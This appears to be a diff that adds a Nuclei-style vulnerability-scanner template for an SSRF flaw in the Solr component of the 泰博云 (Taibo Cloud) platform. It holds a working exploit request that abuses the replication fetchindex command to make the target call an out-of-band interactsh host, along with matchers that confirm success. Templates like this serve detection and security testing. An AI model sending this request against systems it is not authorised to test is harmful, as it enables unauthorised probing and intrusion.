@@ -1,0 +1,33 @@
+id: poc-yaml-tai-bo-yun-solr-ssrf
+info:
+  name: "泰博云平台 Solr SSRF 漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: solr
+
+variables:
+  reverse: '{{interactsh-url}}'
+
+http:
+  - raw:
+      - |
+        GET /solr/collection1/replication/?command=fetchindex&masterUrl=http://{{reverse}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '<str name="status">OK</str>'
+      - type: word
+        part: header
+        words:
+          - "application/xml"
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
